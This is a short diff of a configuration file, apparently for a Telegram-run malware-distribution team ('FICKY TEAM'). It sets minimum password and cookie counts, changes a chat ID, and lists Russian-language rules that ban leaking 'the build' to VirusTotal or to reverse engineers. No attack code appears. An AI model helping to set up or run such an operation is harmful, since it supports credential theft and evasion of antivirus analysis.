@@ -7,7 +7,7 @@ chatlink="https://t.me/+rBsOeH_vBlRlOGIy"
 team="FICKY TEAM"
 minpass=0 
 mincookies=0
-amschatid="1392549702"
+amschatid="2070045449"
 rulestext = """
 1) Запрещено склеивать с файлом вредоносный софт.
 2) Запрещено сливать билд на VT(VirusTotal)/а так же ревёрсы. [Арб на 300$ + кик из тимы]
